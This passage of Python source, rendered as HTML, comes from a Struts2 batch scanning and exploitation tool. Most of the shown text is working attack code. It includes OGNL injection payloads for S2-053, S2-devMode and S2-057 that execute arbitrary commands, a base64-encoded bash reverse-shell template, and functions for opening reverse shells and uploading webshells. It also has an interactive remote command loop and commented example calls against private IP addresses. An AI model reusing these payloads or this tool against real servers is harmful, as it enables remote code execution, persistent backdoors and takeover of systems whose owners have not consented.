&quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-053&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_devMode:</span><br><span class="line">    &quot;&quot;&quot;S2-devMode漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    web_path = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=Is-Struts2-Vul-URL&amp;pp=%2f&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;</span><br><span class="line">    exec_payload = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-devMode&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get_stream(self.url + self.exec_payload.format(cmd=quote(cmd)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_057:</span><br><span class="line">    &quot;&quot;&quot;S2-057漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-057:影响版本Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7BNUM1%2BNUM2%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload3 = &quot;%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload4 = &quot;%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">            self.name = url[rindex + 1:]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.replace(&quot;NUM1&quot;, str(num1)).replace(&quot;NUM2&quot;, str(num2))</span><br><span class="line">        url = self.url + poc + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if str(num1 + num2) in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-057&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def choice_exp(self):</span><br><span class="line">        &quot;&quot;&quot;选择可用的exp&quot;&quot;&quot;</span><br><span class="line">        payloads = [self.exec_payload1, self.exec_payload2, self.exec_payload3, self.exec_payload4]</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        for exp in payloads:</span><br><span class="line">            payload = exp.format(cmd=quote(&quot;echo &quot; + hash_str))</span><br><span class="line">            url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">            html = get_302(url, self.headers, self.encoding)</span><br><span class="line">            if hash_str in html:</span><br><span class="line">                return exp</span><br><span class="line">        return &quot;ERROR: 无可用Payload!&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        exp = self.choice_exp()</span><br><span class="line">        if exp.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return exp</span><br><span class="line"> </span><br><span class="line">        payload = exp.format(cmd=quote(cmd))</span><br><span class="line">        url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># 所有漏洞名称</span><br><span class="line">s2_dict = &#123;&#x27;S2_001&#x27;: S2_001, &#x27;S2_003&#x27;: S2_003, &#x27;S2_005&#x27;: S2_005, &#x27;S2_007&#x27;: S2_007, &#x27;S2_008&#x27;: S2_008, &#x27;S2_009&#x27;: S2_009,</span><br><span class="line">           &#x27;S2_012&#x27;: S2_012, &#x27;S2_013&#x27;: S2_013, &#x27;S2_015&#x27;: S2_015, &#x27;S2_016&#x27;: S2_016, &#x27;S2_019&#x27;: S2_019, &#x27;S2_029&#x27;: S2_029,</span><br><span class="line">           &#x27;S2_032&#x27;: S2_032, &#x27;S2_033&#x27;: S2_033, &#x27;S2_037&#x27;: S2_037, &#x27;S2_045&#x27;: S2_045, &#x27;S2_046&#x27;: S2_046, &#x27;S2_048&#x27;: S2_048,</span><br><span class="line">           &#x27;S2_052&#x27;: S2_052, &#x27;S2_053&#x27;: S2_053, &#x27;S2_devMode&#x27;: S2_devMode, &quot;S2_057&quot;: S2_057&#125;</span><br><span class="line"># S2-052不支持漏洞扫描和检查</span><br><span class="line">s2_list1 = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,</span><br><span class="line">           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057]</span><br><span class="line">s2_list = [&#x27;S2_001&#x27;, &#x27;S2_003&#x27;, &#x27;S2_005&#x27;, &#x27;S2_007&#x27;, &#x27;S2_008&#x27;, &#x27;S2_009&#x27;, &#x27;S2_012&#x27;, &#x27;S2_013&#x27;, &#x27;S2_015&#x27;, &#x27;S2_016&#x27;, &#x27;S2_019&#x27;,</span><br><span class="line">           &#x27;S2_029&#x27;, &#x27;S2_032&#x27;, &#x27;S2_033&#x27;, &#x27;S2_037&#x27;, &#x27;S2_045&#x27;, &#x27;S2_046&#x27;, &#x27;S2_048&#x27;, &#x27;S2_053&#x27;, &#x27;S2_devMode&#x27;, &#x27;S2_057&#x27;]</span><br><span class="line"> </span><br><span class="line"># 支持获取WEB路径的漏洞名称列表</span><br><span class="line">webpath_names = [&quot;S2_001&quot;, &quot;S2_005&quot;, &quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_032&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_devMode&quot;]</span><br><span class="line"># 支持命令执行的漏洞名称列表</span><br><span class="line">exec_names = [&quot;S2_001&quot;, &quot;S2_003&quot;, &quot;S2_005&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;,</span><br><span class="line">              &quot;S2_029&quot;, &quot;S2_032&quot;, &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;,</span><br><span class="line">              &quot;S2_057&quot;]</span><br><span class="line"># 支持反弹shell的漏洞名称列表</span><br><span class="line">reverse_names = [&quot;S2_001&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_029&quot;, &quot;S2_032&quot;,</span><br><span class="line">                 &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;, &quot;S2_057&quot;]</span><br><span class="line"># 支持文件上传的漏洞名称列表</span><br><span class="line">upload_names = [&quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;]</span><br><span class="line"> </span><br><span class="line">banner = &quot;&quot;&quot;</span><br><span class="line"> ____  _              _       ____    ____                  </span><br><span class="line">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  </span><br><span class="line">\___ \| __| &#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;_ \ </span><br><span class="line"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span><br><span class="line">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span><br><span class="line"> </span><br><span class="line">                                      Author By HatBoy        </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def show_info():</span><br><span class="line">    &quot;&quot;&quot;漏洞详情介绍&quot;&quot;&quot;</span><br><span class="line">    click.secho(&quot;[+] 支持如下Struts2漏洞:&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">    for k, v in s2_dict.items():</span><br><span class="line">        click.secho(v.info, fg=&#x27;green&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_one(s):</span><br><span class="line">    &quot;&quot;&quot;检测单个漏洞&quot;&quot;&quot;</span><br><span class="line">    result = s.check()</span><br><span class="line">    return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_one(url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;扫描单个URL漏洞&quot;&quot;&quot;</span><br><span class="line">    click.secho(&#x27;[+] 正在扫描URL:&#x27; + url, fg=&#x27;green&#x27;)</span><br><span class="line">    ss = [s(url, data, headers, encoding) for s in s2_list1]</span><br><span class="line">    with futures.ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">        results = list(executor.map(check_one, ss))</span><br><span class="line">    results = &#123;r for r in results if r&#125;</span><br><span class="line">    click.secho(&#x27;[*] ----------------results------------------&#x27;.format(url=url), fg=&#x27;green&#x27;)</span><br><span class="line">    if (not results) and (not is_quiet):</span><br><span class="line">        click.secho(&#x27;[*] &#123;url&#125; 未发现漏洞&#x27;.format(url=url), fg=&#x27;red&#x27;)</span><br><span class="line">    for r in results:</span><br><span class="line">        if r.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            click.secho(&#x27;[ERROR] &#123;url&#125; 访问出错: &#123;error&#125;&#x27;.format(url=url, error=r[6:]), fg=&#x27;red&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            click.secho(&#x27;[*] &#123;url&#125; 存在漏洞: &#123;name&#125;&#x27;.format(url=url, name=r), fg=&#x27;red&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_more(urls, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;批量扫描URL&quot;&quot;&quot;</span><br><span class="line">    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)</span><br><span class="line">    with futures.ProcessPoolExecutor(max_workers=process) as executor:</span><br><span class="line">        results = list(executor.map(scan, urls))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">CONTEXT_SETTINGS = dict(help_option_names=[&#x27;-h&#x27;, &#x27;--help&#x27;])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@click.command(context_settings=CONTEXT_SETTINGS)</span><br><span class="line">@click.option(&#x27;-i&#x27;, &#x27;--info&#x27;, is_flag=True, help=&quot;漏洞信息介绍&quot;)</span><br><span class="line">@click.option(&#x27;-v&#x27;, &#x27;--version&#x27;, is_flag=True, help=&quot;显示工具版本&quot;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, help=&quot;URL地址&quot;)</span><br><span class="line">@click.option(&#x27;-n&#x27;, &#x27;--name&#x27;, help=&quot;指定漏洞名称, 漏洞名称详见info&quot;)</span><br><span class="line">@click.option(&#x27;-f&#x27;, &#x27;--file&#x27;, help=&quot;批量扫描URL文件, 一行一个URL&quot;)</span><br><span class="line">@click.option(&#x27;-d&#x27;, &#x27;--data&#x27;, help=&quot;POST参数, 需要使用的payload使用&#123;exp&#125;填充, 如: name=test&amp;passwd=&#123;exp&#125;&quot;)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--encode&#x27;, default=&quot;UTF-8&quot;, help=&quot;页面编码, 默认UTF-8编码&quot;)</span><br><span class="line">@click.option(&#x27;-p&#x27;, &#x27;--proxy&#x27;, help=&quot;HTTP代理. 格式为http://ip:port&quot;)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--timeout&#x27;, help=&quot;HTTP超时时间, 默认10s&quot;)</span><br><span class="line">@click.option(&#x27;-w&#x27;, &#x27;--workers&#x27;, help=&quot;批量扫描进程数, 默认为10个进程&quot;)</span><br><span class="line">@click.option(&#x27;--header&#x27;, help=&quot;HTTP请求头, 格式为: key1=value1&amp;key2=value2&quot;)</span><br><span class="line">@click.option(&#x27;-e&#x27;, &#x27;--exec&#x27;, is_flag=True, help=&quot;进入命令执行shell&quot;)</span><br><span class="line">@click.option(&#x27;--webpath&#x27;, is_flag=True, help=&quot;获取WEB路径&quot;)</span><br><span class="line">@click.option(&#x27;-r&#x27;, &#x27;--reverse&#x27;, help=&quot;反弹shell地址, 格式为ip:port&quot;)</span><br><span class="line">@click.option(&#x27;--upfile&#x27;, help=&quot;需要上传的文件路径和名称&quot;)</span><br><span class="line">@click.option(&#x27;--uppath&#x27;, help=&quot;上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp&quot;)</span><br><span class="line">@click.option(&#x27;-q&#x27;, &#x27;--quiet&#x27;, is_flag=True, help=&quot;关闭打印不存在漏洞的输出，只保留存在漏洞的输出&quot;)</span><br><span class="line">def main(info, version, url, file, name, data, header, encode, proxy, exec, reverse, upfile, uppath, quiet, timeout,</span><br><span class="line">         workers, webpath):</span><br><span class="line">    &quot;&quot;&quot;Struts2批量扫描利用工具&quot;&quot;&quot;</span><br><span class="line">    global proxies, is_quiet, _tiemout, process</span><br><span class="line">    click.secho(banner, fg=&#x27;red&#x27;)</span><br><span class="line">    if not encode:</span><br><span class="line">        encode = &#x27;UTF-8&#x27;</span><br><span class="line">    if info:</span><br><span class="line">        show_info()</span><br><span class="line">        exit(0)</span><br><span class="line">    if version:</span><br><span class="line">        click.secho(&quot;[+] Struts2 Scan V0.1&quot;, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line">    if proxy:</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            &quot;http&quot;: proxy,</span><br><span class="line">            &quot;https&quot;: proxy</span><br><span class="line">        &#125;</span><br><span class="line">    if quiet:</span><br><span class="line">        is_quiet = True</span><br><span class="line">    if timeout and check_int(&#x27;timeout&#x27;, timeout):</span><br><span class="line">        _tiemout = check_int(&#x27;timeout&#x27;, timeout)</span><br><span class="line">    if workers and check_int(&#x27;workers&#x27;, workers):</span><br><span class="line">        process = check_int(&#x27;workers&#x27;, workers)</span><br><span class="line">    if url and not name:</span><br><span class="line">        scan_one(url, data, header, encode)</span><br><span class="line">    if file:</span><br><span class="line">        urls = read_urls(file)</span><br><span class="line">        scan_more(urls, data, header, encode)</span><br><span class="line">    if name and url:</span><br><span class="line">        # 指定漏洞利用</span><br><span class="line">        name = name.upper().replace(&#x27;-&#x27;, &#x27;_&#x27;)</span><br><span class="line">        if name not in s2_list:</span><br><span class="line">            click.secho(&quot;[ERROR] 暂不支持&#123;name&#125;漏洞利用&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">            exit(0)</span><br><span class="line">        s = s2_dict[name](url, data, header, encode)</span><br><span class="line">        s.check()</span><br><span class="line">        if not s.is_vul:</span><br><span class="line">            click.secho(&quot;[ERROR] 该URL不存在&#123;name&#125;漏洞&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">        if webpath:</span><br><span class="line">            if name in webpath_names:</span><br><span class="line">                web_path = s.get_path()</span><br><span class="line">                click.secho(&quot;[*] &#123;webpath&#125;&quot;.format(webpath=web_path), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持获取WEB路径&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if reverse:</span><br><span class="line">            if name in reverse_names:</span><br><span class="line">                click.secho(&quot;[*] 请在反弹地址处监听端口如: nc -lvvp 8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                if &#x27;:&#x27; not in reverse:</span><br><span class="line">                    click.secho(&quot;[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                ip = reverse.split(&#x27;:&#x27;)[0].strip()</span><br><span class="line">                port = reverse.split(&#x27;:&#x27;)[1].strip()</span><br><span class="line">                s.reverse_shell(ip, port)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持反弹shell&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if upfile and uppath:</span><br><span class="line">            if name in upload_names and check_file(upfile):</span><br><span class="line">                result = s.upload_shell(uppath, upfile)</span><br><span class="line">                if result is True:</span><br><span class="line">                    click.secho(&quot;[+] 文件上传成功!&quot;, fg=&quot;green&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                elif str(result).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                    click.secho(&quot;[ERROR] 文件上传失败! &#123;error&#125;&quot;.format(error=result[6:]), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                else:</span><br><span class="line">                    click.secho(&quot;[ERROR] 文件上传失败! \n&#123;error&#125;&quot;.format(error=result), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持文件上传&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if exec:</span><br><span class="line">            if name in exec_names:</span><br><span class="line">                if name == &quot;S2_052&quot;:</span><br><span class="line">                    click.secho(&quot;[+] 提示: S2_052命令执行无回显，可将结果写入文件访问&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">                while True:</span><br><span class="line">                    cmd = input(&#x27;&gt;&gt;&gt;&#x27;)</span><br><span class="line">                    result = s.exec_cmd(cmd)</span><br><span class="line">                    click.secho(result, fg=&#x27;red&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] 漏洞&#123;name&#125;不支持命令执行&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        click.secho(s.info, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()</span><br><span class="line">    except KeyboardInterrupt as e:</span><br><span class="line">        exit(0)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;error&#125;&quot;.format(error=e), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"># s = S2_001(&quot;http://192.168.100.8:8080/login.action&quot;)</span><br><span class="line"># print(s.info)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s =  S2_003(&quot;http://192.168.100.8:8080/showcase.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_005(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_007(&quot;http://192.168.100.8:8080/user.action&quot;, &quot;name=admin&amp;email=admin&amp;age=&#123;exp&#125;&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_008(&quot;http://192.168.100.8:8080&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_009(&quot;http://192.168.100.8:8080/ajax/example5.action?age=123&quot;, &quot;name&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_012(&quot;http://192.168.100.8:8080/S2-012/user.action?name=&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_013(&quot;http://192.168.100.8:8080/S2-013/link.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_015(&quot;http://192.168.100.8:8080/param.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_016(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># 